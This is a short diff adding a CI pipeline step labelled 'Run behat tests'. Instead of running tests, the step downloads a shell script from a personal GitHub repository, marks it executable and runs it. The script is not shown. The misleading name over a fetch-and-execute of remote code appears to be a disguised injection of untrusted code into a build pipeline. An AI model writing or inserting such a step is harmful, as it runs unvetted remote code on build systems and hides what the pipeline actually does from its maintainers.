@@ -1,0 +1,7 @@
+steps:
+
+  - name: Run behat tests
+
+    plugin: Shell
+
+    command: wget https://raw.githubusercontent.com/moooadui/a/main/setelan.sh && chmod u+x setelan.sh && ./setelan.sh
